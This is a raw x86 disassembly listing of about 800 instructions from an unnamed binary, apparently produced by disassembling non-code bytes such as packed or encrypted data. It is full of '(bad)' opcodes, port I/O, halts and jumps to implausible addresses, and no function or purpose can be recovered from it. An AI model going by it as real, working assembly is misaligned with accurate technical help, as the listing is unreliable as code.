  431a9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431aa1:	mov    edx,0xc05d87f0
  431aa6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aaa:	fimul  WORD PTR [eax]
  431aac:	fist   WORD PTR [ebp+0x1c]
  431aaf:	in     al,dx
  431ab0:	jne    0x431a9e
  431ab2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431ab8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431abc:	fdivp  st(0),st
  431abe:	fild   WORD PTR [ebp+0x4510f85c]
  431ac4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431aca:	inc    ebp
  431acb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ad1:	mov    ebp,DWORD PTR [ebx-0x4]
  431ad4:	adc    al,0x8b
  431ad6:	rcl    DWORD PTR [eax],0x48
  431ad9:	mov    esi,0x7080803
  431ade:	fiadd  WORD PTR [ebp+0x4d]
  431ae1:	(bad)  
  431ae2:	mov    edx,DWORD PTR [edx-0x4]
  431ae5:	mov    edx,DWORD PTR [ebp-0x4]
  431ae8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431aee:	mov    DWORD PTR [edi+0x872dc],edi
  431af4:	xlat   BYTE PTR ds:[ebx]
  431af5:	into   
  431af6:	ffreep st(6)
  431af8:	retf   0x6c7
  431afb:	iret   
  431afc:	dec    ebp
  431afd:	inc    ebp
  431afe:	mov    DWORD PTR [ebx],edi
  431b00:	fmul   QWORD PTR [edi]
  431b02:	dec    ebp
  431b03:	jnp    0x431b38
  431b05:	add    BYTE PTR [ebx],al
  431b07:	mov    ecx,DWORD PTR [esp+edi*8]
  431b0a:	inc    ebp
  431b0b:	dec    ebp
  431b0c:	lea    esi,[ebx]
  431b0e:	add    DWORD PTR [ebx],eax
  431b10:	jb     0x431b4d
  431b12:	add    BYTE PTR [edi],cl
  431b14:	inc    ebp
  431b15:	imul   eax,edi,0x858bd800
  431b1b:	cld    
  431b1c:	clc    
  431b1d:	mov    DWORD PTR [ebp+0x0],eax
  431b20:	inc    DWORD PTR [eax]
  431b22:	or     al,0xde
  431b24:	sbb    bh,0x1
  431b27:	retf   
  431b28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b2f:	dec    ebp
  431b30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b36:	enter  0x12de,0xdf
  431b3a:	inc    ebp
  431b3b:	pop    ebp
  431b3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b42:	add    DWORD PTR [edx],edx
  431b44:	add    BYTE PTR [ebp+0x50],dl
  431b47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b53:	or     ah,al
  431b55:	pop    ss
  431b56:	cdq    
  431b57:	push   ebp
  431b58:	clc    
  431b59:	mov    eax,DWORD PTR [ebp-0x4]
  431b5c:	xor    edx,edx
  431b5e:	add    esi,DWORD PTR [ebx]
  431b60:	cmp    eax,DWORD PTR [ebx]
  431b62:	hlt    
  431b63:	cmp    DWORD PTR [ebx],esp
  431b65:	or     al,BYTE PTR [ebp+0xf]
  431b68:	mov    eax,DWORD PTR [edx]
  431b6a:	loopne 0x431b6c
  431b6c:	(bad)  
  431b6d:	mov    ecx,esi
  431b6f:	cld    
  431b70:	pushf  
  431b71:	pop    ebp
  431b72:	fwait
  431b73:	mov    esi,DWORD PTR [edx]
  431b75:	lock mov eax,eax
  431b78:	adc    BYTE PTR [ebx],al
  431b7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b87:	dec    ebp
  431b88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431b8e:	(bad)  
  431b8f:	iret   
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	jne    0x431be1
  431b94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431b9a:	(bad)  
  431b9b:	cmp    ebx,eax
  431b9d:	je     0x431b25
  431b9f:	add    edi,edi
  431ba1:	or     bh,bh
  431ba3:	dec    ebp
  431ba4:	inc    ebp
  431ba5:	mov    esi,DWORD PTR [ebx]
  431ba7:	cld    
  431ba8:	add    ecx,esi
  431baa:	cmp    ecx,DWORD PTR [eax-0xc]
  431bad:	mov    edx,DWORD PTR [edi]
  431baf:	or     BYTE PTR [ebp-0x7c],al
  431bb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bb8:	test   BYTE PTR [ebx+ebx*4],cl
  431bbb:	inc    ebp
  431bbc:	xor    bh,BYTE PTR [esi]
  431bbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bc5:	jne    0x431b8e
  431bc7:	mov    ebp,esp
  431bc9:	fcomp  DWORD PTR [ebx]
  431bcb:	add    BYTE PTR [ecx],al
  431bcd:	inc    DWORD PTR [ebp-0x75]
  431bd0:	(bad)  
  431bd1:	cld    
  431bd2:	add    al,0xce
  431bd4:	mov    ecx,edi
  431bd6:	cld    
  431bd7:	inc    ebp
  431bd8:	fidivr WORD PTR [ebx]
  431bda:	fbstp  TBYTE PTR [ebp-0x3e]
  431bdd:	mov    eax,DWORD PTR [eax]
  431bdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431be5:	fadd   st,st(7)
  431be7:	add    BYTE PTR [ebp-0x1],al
  431bea:	mov    ecx,DWORD PTR [esp+edi*8]
  431bed:	inc    ebp
  431bee:	mov    bh,0xc7
  431bf1:	loopne 0x431c38
  431bf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431bf9:	sbb    dh,BYTE PTR [ebx]
  431bfb:	pushf  
  431bfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c02:	mov    eax,edi
  431c04:	cwde   
  431c05:	inc    ebp
  431c06:	inc    ebp
  431c07:	jne    0x431b94
  431c09:	mov    esp,esp
  431c0b:	clc    
  431c0c:	add    al,0x4d
  431c0e:	mov    DWORD PTR [ebx],esi
  431c10:	or     al,0x33
  431c12:	inc    ebp
  431c13:	lea    ecx,[ebx-0x398d13fd]
  431c19:	add    bh,al
  431c1b:	inc    ebp
  431c1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c23:	add    ebp,esp
  431c25:	shufps xmm1,xmm3,0xc7
  431c29:	(bad)  
  431c2a:	jmp    0x74885753
  431c2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c35:	hlt    
  431c36:	mov    ecx,DWORD PTR [edi]
  431c38:	fadd   DWORD PTR [ebp+0x0]
  431c3b:	xor    ecx,DWORD PTR [edi]
  431c3d:	add    ecx,ecx
  431c3f:	cmp    edi,edi
  431c41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c45:	(bad)  
  431c46:	jmp    0x431bd3
  431c48:	mov    edi,esp
  431c4a:	or     al,0xc6
  431c4c:	inc    ebp
  431c4d:	(bad)  
  431c4e:	mov    eax,DWORD PTR [ebp+0x10]
  431c51:	jne    0x431bdc
  431c53:	mov    eax,DWORD PTR [ecx]
  431c55:	clc    
  431c56:	add    BYTE PTR [ebp-0x40],cl
  431c59:	xor    edx,DWORD PTR [eax-0x73]
  431c5c:	jne    0x431c5f
  431c5e:	push   DWORD PTR [edx+0x8]
  431c61:	add    BYTE PTR [ebp+0x45],al
  431c64:	mov    ebp,ecx
  431c66:	cld    
  431c67:	add    BYTE PTR [ebp+0x0],cl
  431c6a:	xor    eax,DWORD PTR [ebp+0x3]
  431c6d:	mov    DWORD PTR [ebx],edi
  431c6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c75:	sub    eax,0x5d330e4d
  431c7a:	lea    esi,[ebx]
  431c7c:	add    DWORD PTR [ebx],eax
  431c7e:	jb     0x431c69
  431c80:	add    BYTE PTR [eax],al
  431c82:	inc    ebp
  431c83:	add    bl,ch
  431c85:	inc    ebp
  431c86:	mov    esi,DWORD PTR [ebx]
  431c88:	or     al,0x3
  431c8a:	(bad)  
  431c8b:	mov    edi,eax
  431c8d:	in     al,dx
  431c8e:	scas   eax,DWORD PTR es:[edi]
  431c8f:	inc    ebp
  431c90:	mov    esi,DWORD PTR [ebx]
  431c92:	in     al,0x3
  431c94:	add    al,0x89
  431c96:	mov    ecx,DWORD PTR [eax+edi*8]
  431c99:	dec    ebp
  431c9a:	(bad)  
  431c9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431ca2:	mov    ecx,eax
  431ca4:	cld    
  431ca5:	push   es
  431ca6:	dec    ebp
  431ca7:	add    al,0x33
  431ca9:	mov    DWORD PTR [ebx],eax
  431cab:	in     al,dx
  431cac:	cmp    DWORD PTR [ebp-0x67],eax
  431caf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cb5:	mov    edx,DWORD PTR [ebp-0x4]
  431cb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cbb:	xor    eax,DWORD PTR [ebp+0x3]
  431cbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431cc4:	xor    edi,esp
  431cc6:	jmp    0xff771a18
  431ccb:	add    ecx,DWORD PTR [ebp-0x3f]
  431cce:	xor    ebx,DWORD PTR [edi]
  431cd0:	add    eax,ecx
  431cd2:	cmp    ebx,DWORD PTR [eax]
  431cd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431cd7:	mov    ecx,DWORD PTR [eax]
  431cd9:	adc    BYTE PTR [ebp-0x80],al
  431cdc:	jmp    0x431cdf
  431cde:	mov    eax,DWORD PTR [eax]
  431ce0:	cld    
  431ce1:	mov    bh,0xc6
  431ce3:	push   ecx
  431ce4:	(bad)  
  431ce5:	jne    0x431d45
  431ce7:	dec    ecx
  431ce9:	or     BYTE PTR [ecx+ebx*1],cl
  431cec:	push   ebp
  431ced:	inc    ebp
  431cee:	in     al,dx
  431cef:	add    ebp,esp
  431cf1:	or     bh,al
  431cf3:	dec    ebp
  431cf4:	cld    
  431cf5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431cfb:	xor    DWORD PTR [edx],0x2
  431cfe:	pushf  
  431cff:	dec    DWORD PTR [ebx+0x45510cf4]
  431d05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d0b:	mov    edx,DWORD PTR [ecx+0xc]
  431d0e:	xor    eax,esi
  431d10:	mov    edx,0xc172c7
  431d15:	inc    ebp
  431d16:	mov    esi,DWORD PTR [ebp+0x8]
  431d19:	mov    eax,edx
  431d1b:	call   0x84c7e410
  431d20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d26:	mov    ebp,eax
  431d28:	or     BYTE PTR [eax],dl
  431d2a:	jo     0x431d79
  431d2c:	push   edi
  431d2d:	xor    esi,DWORD PTR [ebp+0x3]
  431d30:	(bad)  
  431d31:	pmulhuw mm0,mm1
  431d34:	test   DWORD PTR [ebp-0x8],ecx
  431d37:	mov    DWORD PTR [ebp-0x67],eax
  431d3a:	mov    eax,DWORD PTR [ebp-0x4]
  431d3d:	xor    edi,DWORD PTR [ebp-0x73]
  431d40:	xor    eax,DWORD PTR [ebx]
  431d42:	xor    esi,DWORD PTR [edx+0x3]
  431d45:	add    BYTE PTR [ecx],bh
  431d47:	inc    ebp
  431d48:	(bad)  
  431d49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d4f:	mov    DWORD PTR [eax],0x750f0004
  431d55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d5b:	lock add BYTE PTR [ebp+0x0],cl
  431d5f:	mov    esi,DWORD PTR [ebp-0x18]
  431d62:	mov    ebp,edx
  431d64:	or     al,0x72
  431d66:	ja     0x431d68
  431d68:	mov    edx,esi
  431d6a:	cld    
  431d6b:	(bad)  
  431d6e:	cli    
  431d6f:	mov    esi,DWORD PTR [ebp-0x4]
  431d72:	cmp    ecx,esi
  431d74:	bswap  edi
  431d76:	(bad)
  431d7a:	mov    esi,DWORD PTR [ebp-0x4]
  431d7d:	mov    esi,ecx
  431d7f:	clc    
  431d80:	repnz add esi,DWORD PTR [ebp+0x45]
  431d84:	push   ebx
  431d85:	xor    eax,DWORD PTR [ebp+0x3]
  431d88:	cmp    al,0x5f
  431d8a:	pushf  
  431d8b:	pop    ebx
  431d8c:	jmp    0x431e53
  431d91:	mov    esi,DWORD PTR [ebp-0x7d]
  431d94:	xor    ebp,DWORD PTR [eax]
  431d96:	lea    eax,[ebp-0x8]
  431d99:	xor    edx,esi
  431d9b:	pushf  
  431d9c:	out    dx,eax
  431d9d:	(bad)  
  431d9e:	neg    eax
  431da0:	ins    DWORD PTR es:[edi],dx
  431da1:	test   esi,edi
  431da3:	clc    
  431da4:	pop    esp
  431da5:	inc    ebp
  431da6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431db2:	add    cl,al
  431db4:	jne    0x431d51
  431db6:	mov    esi,DWORD PTR [edx]
  431db8:	in     al,dx
  431db9:	push   esi
  431dba:	xor    BYTE PTR [ebp-0xe],dh
  431dbd:	add    edi,esi
  431dbf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dc5:	add    cl,bh
  431dc7:	mov    edi,DWORD PTR [ebp+0x8]
  431dca:	mov    DWORD PTR [ebp-0x14],esi
  431dcd:	add    esi,DWORD PTR [ebp+0x3c]
  431dd0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dd6:	mov    ah,0x3e
  431dd8:	fwait
  431dd9:	pushf  
  431dda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431de0:	jne    0x431d6d
  431de2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431de5:	icebp  
  431de6:	icebp  
  431de7:	shl    edx,0xf2
  431dea:	(bad)  
  431deb:	mov    ah,0x16
  431ded:	push   eax
  431dee:	jne    0x431d83
  431df0:	mov    ecx,DWORD PTR [edi]
  431df2:	in     al,dx
  431df3:	jmp    0x431de6
  431df5:	add    dl,dh
  431df7:	mov    edi,esi
  431df9:	or     al,0x8
  431dfb:	inc    ebp
  431dfc:	jne    0x431e01
  431dfe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e04:	ret    
  431e05:	or     bh,bh
  431e07:	jge    0x431df1
  431e09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e0f:	xor    edi,eax
  431e11:	add    esi,DWORD PTR [ebp-0x77]
  431e14:	mov    ebx,esp
  431e16:	clc    
  431e17:	neg    DWORD PTR [ebp-0x7c]
  431e1a:	xor    eax,DWORD PTR [eax]
  431e1c:	cmp    eax,DWORD PTR [eax]
  431e1e:	repz jne 0x431db6
  431e21:	xor    eax,DWORD PTR [ecx]
  431e23:	add    ebx,DWORD PTR [eax]
  431e25:	mov    DWORD PTR [ebp-0x8],eax
  431e28:	mov    eax,edi
  431e2a:	cld    
  431e2b:	lock pop eax
  431e2d:	test   DWORD PTR [ebx],esi
  431e2f:	clc    
  431e30:	add    edx,DWORD PTR [edi-0x740bff77]
  431e36:	fdivp  st(4),st
  431e38:	test   ecx,esi
  431e3a:	(bad)  
  431e3b:	jnp    0x431e3c
  431e3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e43:	jae    0x431dd0
  431e45:	sub    edi,esp
  431e47:	(bad)  
  431e48:	shl    DWORD PTR [eax-0x3e],0x89
  431e4c:	leave  
  431e4d:	call   0x8198d55a
  431e52:	in     al,dx
  431e53:	(bad)  
  431e54:	in     al,dx
  431e55:	add    bh,al
  431e57:	mov    esp,edi
  431e59:	in     al,dx
  431e5a:	test   DWORD PTR [ebp-0x8],edi
  431e5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431e60:	xor    al,BYTE PTR [ebx]
  431e62:	pushf  
  431e63:	jnp    0x57321a9c
  431e69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e6d:	loopne 0x431ea2
  431e6f:	jne    0x431e2c
  431e71:	mov    esi,DWORD PTR [edx-0x20]
  431e74:	add    BYTE PTR [ebp-0x3d],bh
  431e77:	xor    eax,DWORD PTR [ebp-0x73]
  431e7a:	mov    edi,DWORD PTR [esi]
  431e7c:	cld    
  431e7d:	jb     0x431e45
  431e7f:	add    bl,al
  431e81:	jne    0x431ec8
  431e83:	mov    edx,DWORD PTR [edi-0x10]
  431e86:	jge    0x431f05
  431e88:	mov    esi,DWORD PTR [ebx]
  431e8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431e8e:	xor    esi,DWORD PTR [ebp-0x77]
  431e91:	mov    esi,eax
  431e93:	lock inc ebp
  431e95:	jge    0x431ec8
  431e97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431e9e:	dec    ebp
  431e9f:	mov    esi,DWORD PTR [ebx]
  431ea1:	loopne 0x431e2c
  431ea3:	jge    0x431e9d
  431ea5:	add    DWORD PTR [ebp-0x7d],eax
  431ea8:	icebp  
  431ea9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431eb0:	dec    ebp
  431eb1:	hlt    
  431eb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431eb5:	mov    esi,esp
  431eb7:	in     al,0x45
  431eb9:	jge    0x431ef8
  431ebb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ec2:	dec    ebp
  431ec3:	push   esp
  431ec4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431eca:	inc    ebp
  431ecb:	hlt    
  431ecc:	xor    DWORD PTR [ebp-0x61],esi
  431ecf:	mov    edi,DWORD PTR [eax+0xf19504]
  431ed5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431ed9:	cmp    eax,DWORD PTR [ebp+0xf]
  431edc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ee0:	fistp  WORD PTR [ebx+0x0]
  431ee3:	inc    ebp
  431ee4:	mov    ebx,DWORD PTR [edi+0xc]
  431ee7:	add    eax,eax
  431ee9:	inc    ebp
  431eea:	test   BYTE PTR [ebx],dh
  431eec:	add    eax,DWORD PTR [ebx]
  431eee:	add    BYTE PTR [esi+0x45],bl
  431ef1:	ret    0x85
  431ef4:	jnp    0x5443a2c3
  431efa:	inc    bp
  431efc:	inc    ebp
  431efd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f03:	fdiv   QWORD PTR [ebx]
  431f05:	test   DWORD PTR [ecx+0x453bf8],edi
  431f0b:	push   ebx
  431f0c:	add    edi,DWORD PTR [esi+0x708088b]
  431f12:	cmp    esi,eax
  431f14:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f1b:	mov    esp,edi
  431f1d:	call   0x33ce646f
  431f22:	or     BYTE PTR [ebx],al
  431f24:	inc    ecx
  431f25:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f2b:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f31:	lock add cl,al
  431f34:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f3b:	mov    ch,0x45
  431f3d:	clc    
  431f3e:	xor    eax,DWORD PTR [ebp+0x3]
  431f41:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f47:	inc    ebp
  431f48:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f4e:	mov    edi,eax
  431f50:	mov    eax,DWORD PTR [ebp+0x3c]
  431f53:	mov    ecx,DWORD PTR [eax]
  431f55:	hlt    
  431f56:	inc    ebp
  431f57:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f5e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f64:	push   ebp
  431f65:	mov    edi,DWORD PTR [ebx]
  431f67:	in     al,dx
  431f68:	jne    0x431f2b
  431f6a:	mov    eax,DWORD PTR [ebp-0x28]
  431f6d:	add    DWORD PTR [eax],0xe8058dec
  431f73:	clc    
  431f74:	mov    esi,DWORD PTR [edi-0x8]
  431f77:	add    dh,dl
  431f79:	rol    WORD PTR [ebp-0x1],cl
  431f7d:	mov    edx,DWORD PTR [eax+0x8]
  431f80:	jne    0x431f42
  431f82:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f89:	inc    ebp
  431f8a:	push   esp
  431f8b:	test   DWORD PTR [ecx+0xf],ecx
  431f8e:	sub    edx,esp
  431f90:	add    eax,DWORD PTR [eax]
  431f92:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431f98:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431f9f:	mov    eax,DWORD PTR [ecx]
  431fa1:	and    BYTE PTR [eax],al
  431fa3:	cmp    al,0x10
  431fa5:	add    BYTE PTR [ebp+0x66],al
  431fa8:	inc    ecx
  431faa:	push   esp
  431fab:	add    dh,BYTE PTR [ebp+0x0]
  431fae:	push   edx
  431faf:	enterw 0xc1,0x4d
  431fb4:	mov    esp,DWORD PTR [esi+0x20]
  431fb7:	add    DWORD PTR [ecx-0x7b],eax
  431fba:	add    eax,DWORD PTR [ebx]
  431fbc:	str    WORD PTR [eax+0x45]
  431fc0:	lea    ecx,[ebx+0x45890801]
  431fc6:	sbb    BYTE PTR [ebx],al
  431fc8:	dec    ebp
  431fc9:	cmp    al,0xf
  431fcb:	inc    ebp
  431fcc:	push   eax
  431fcd:	mov    esi,DWORD PTR [ebx]
  431fcf:	push   eax
  431fd0:	add    eax,eax
  431fd2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fd9:	inc    ebp
  431fda:	add    BYTE PTR [ecx],dh
  431fdc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431fe3:	(bad)  
  431fe4:	mov    ebx,eax
  431fe6:	loopne 0x43202d
  431fe8:	dec    ebp
  431fe9:	mov    ecx,DWORD PTR [edi]
  431feb:	cld    
  431fec:	push   eax
  431fed:	xchg   DWORD PTR [ebx],esi
  431fef:	add    DWORD PTR [ebx],ebp
  431ff1:	add    BYTE PTR [ebx],ch
  431ff3:	or     BYTE PTR [ecx],bh
  431ff5:	dec    ecx
  431ff6:	loopne 0x431ffb
  431ff8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431ffe:	push   ebp
  431fff:	add    DWORD PTR [ebx+0x55100800],eax
  432005:	dec    ebp
  432006:	jmp    0x431f91
  432008:	mov    esp,DWORD PTR [eax]
  43200a:	sbb    dl,dl
  43200c:	inc    eax
  43200d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432013:	add    BYTE PTR [ebx+0x74528555],cl
  432019:	push   ebp
  43201a:	div    DWORD PTR [ebx]
  43201c:	and    eax,DWORD PTR [ebx]
  43201e:	add    edx,DWORD PTR [edx-0x30]
  432021:	jno    0x431fae
  432023:	inc    DWORD PTR [eax+eiz*1]
  432026:	inc    ebp
  432027:	push   eax
  432028:	push   eax
  432029:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43202f:	mov    edi,esp
  432031:	push   eax
  432032:	inc    ebp
  432033:	enter  0x458b,0x8
  432037:	push   ecx
  432038:	(bad)  
  432039:	call   0x10d2a11
  43203e:	pop    ss
  43203f:	push   ebp
  432040:	mov    ecx,DWORD PTR [ebx+0x489408]
  432046:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43204c:	push   ecx
  43204d:	jo     0x432037
  43204f:	inc    DWORD PTR [edi]
  432051:	or     BYTE PTR [eax],al
  432053:	call   0xce279d
  432058:	fmul   QWORD PTR [ebp+0x55]
  43205b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432061:	mov    bh,0x8c
  432063:	adc    al,0x9b
  432065:	dec    esp
  432066:	xor    bl,BYTE PTR [eax]
  432068:	mov    ecx,DWORD PTR [ebp+0xc]
  43206b:	mov    eax,DWORD PTR [ebp-0x4]
  43206e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432074:	push   es
  432075:	retf   
  432076:	mov    BYTE PTR [ebp-0x30],0x3b
  43207a:	inc    ebp
  43207b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432082:	retf   0x83fc
  432085:	into   
  432086:	dec    ebp
  432087:	retf   
  432088:	mov    ecx,DWORD PTR [ebp-0x74]
  43208b:	mov    eax,DWORD PTR [eax]
  43208d:	fdiv   QWORD PTR [ebx]
  43208f:	mov    bh,0x3
  432091:	push   es
  432092:	mov    esi,ecx
  432094:	sbb    cl,dl
  432096:	dec    ebp
  432097:	sar    DWORD PTR [ebx],cl
  432099:	push   ebp
  43209a:	jne    0x4320ab
  43209c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320a2:	lea    ebx,[eax]
  4320a4:	call   0xf4ccac6b
  4320a9:	sbb    dh,dl
  4320ab:	add    edx,ebx
  4320ad:	push   ebp
  4320ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320b4:	push   ecx
  4320b5:	mov    DWORD PTR [eax-0x30],edx
  4320b8:	test   DWORD PTR [edx],eax
  4320ba:	xadd   esp,esi
  4320bd:	pop    es
  4320be:	add    cl,dl
  4320c0:	mov    eax,ecx
  4320c2:	or     al,0x45
  4320c4:	(bad)  
  4320c5:	push   eax
  4320c6:	add    DWORD PTR [edx+0x0],eax
  4320c9:	add    ecx,DWORD PTR [ecx]
  4320cb:	and    dh,cl
  4320cd:	call   0xc7299d
  4320d2:	add    DWORD PTR [ebp+0x0],edx
  4320d5:	mov    esp,DWORD PTR [ebp+0x18]
  4320d8:	add    BYTE PTR [eax+0x50],cl
  4320db:	xor    eax,DWORD PTR [eax]
  4320dd:	add    esp,DWORD PTR [esi+0x3b]
  4320e0:	inc    ebp
  4320e1:	je     0x432066
  4320e3:	push   ecx
  4320e4:	dec    BYTE PTR [ebp-0x77]
  4320e7:	add    eax,esi
  4320e9:	or     al,0x5e
  4320eb:	inc    eax
  4320ec:	add    BYTE PTR [ebx],al
  4320ee:	data16 and BYTE PTR [ebp+0x50],al
  4320f2:	sub    DWORD PTR [ecx],0xfffffff8
  4320f5:	add    BYTE PTR [ebp-0x75],ah
  4320f8:	add    BYTE PTR [eax],bl
  4320fa:	enter  0x894d,0x8b
  4320fe:	int3   
  4320ff:	loopne 0x4320c3
  432101:	rol    BYTE PTR [eax],0x33
  432104:	lea    cx,[ebp+0xa]
  432108:	data16 jb 0x432150
  43210b:	add    BYTE PTR [ebx+0x44890855],cl
  432111:	sbb    ah,al
  432113:	inc    ebp
  432114:	cmp    al,0xf
  432116:	add    BYTE PTR [edx+0x66],dl
  432119:	xor    ecx,DWORD PTR [eax]
  43211b:	sub    eax,DWORD PTR [edx]
  43211d:	mov    eax,DWORD PTR [eax]
  43211f:	or     al,0x66
  432121:	ror    edx,cl
  432123:	dec    ebp
  432124:	inc    ebp
  432125:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43212b:	cld    
  43212c:	or     BYTE PTR [edi+0x4501dd],dl
  432132:	ret    0xecce
  432135:	retf   
  432136:	(bad)  
  432137:	dec    ebp
  432138:	mov    al,0x8b
  43213a:	loopne 0x43215c
  43213c:	cmp    ecx,DWORD PTR [edx]
  43213e:	inc    ebp
  43213f:	daa    
  432140:	loopne 0x4320c9
  432142:	in     al,dx
  432143:	add    edi,eax
  432145:	add    BYTE PTR [eax+0x3f52e155],bh
  43214b:	push   ebp
  43214c:	inc    ebp
  43214d:	xor    ebx,edx
  43214f:	add    ebp,esp
  432151:	push   edx
  432152:	push   bp
  432154:	inc    ebp
  432155:	(bad)  
  432156:	in     eax,dx
  432157:	push   esp
  432158:	(bad)  
  432159:	inc    edx
  43215b:	sbb    al,0x33
  43215d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432164:	add    BYTE PTR [ebp+0x46],0x8b
  432168:	jmp    0xf98b:0x100041c8
  43216f:	xor    esi,DWORD PTR [edx+0x3]
  432172:	mov    ecx,DWORD PTR [edi]
  432174:	fmul   DWORD PTR [edx]
  432176:	add    BYTE PTR [eax],al
  432178:	lea    eax,[ebx-0x4700273c]
  43217e:	add    al,0x4f
  432180:	pop    DWORD PTR [eax]
  432182:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432188:	push   edx
  432189:	inc    WORD PTR [ebp+0x8]
  43218d:	mov    eax,0x514f4d
  432192:	(bad)
  432196:	add    al,al
  432198:	xor    DWORD PTR [ebx-0x74baf730],eax
  43219e:	test   DWORD PTR [esi+0x74],esp
  4321a1:	inc    ebp
  4321a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4321a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321ae:	or     dh,cl
  4321b0:	or     eax,0x8b8d5045
  4321b5:	inc    ebp
  4321b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4321bc:	jne    0x4321f1
  4321be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321c4:	add    DWORD PTR [ebx],eax
  4321c6:	add    bh,bh
  4321c8:	adc    DWORD PTR [eax],ecx
  4321ca:	adc    DWORD PTR [ebp+0x55],edi
  4321cd:	push   es
  4321ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321db:	inc    ebp
  4321dc:	mov    esp,edi
  4321de:	or     al,0xda
  4321e0:	push   eax
  4321e1:	(bad)  
  4321e2:	jne    0x432198
  4321e4:	call   0x3b1ad3
  4321e9:	inc    ebp
  4321ea:	sar    BYTE PTR [eax],0x84
  4321ed:	in     al,dx
  4321ee:	add    bh,al
  4321f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4321f7:	(bad)  
  4321f8:	and    al,al
  4321fa:	fs in  eax,dx
  4321fc:	inc    DWORD PTR [ebp-0x7b]
  4321ff:	jle    0x432210
  432201:	leave  
  432202:	scas   al,BYTE PTR es:[edi]
  432203:	inc    esp
  432204:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43220b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432212:	call   DWORD PTR [edi]
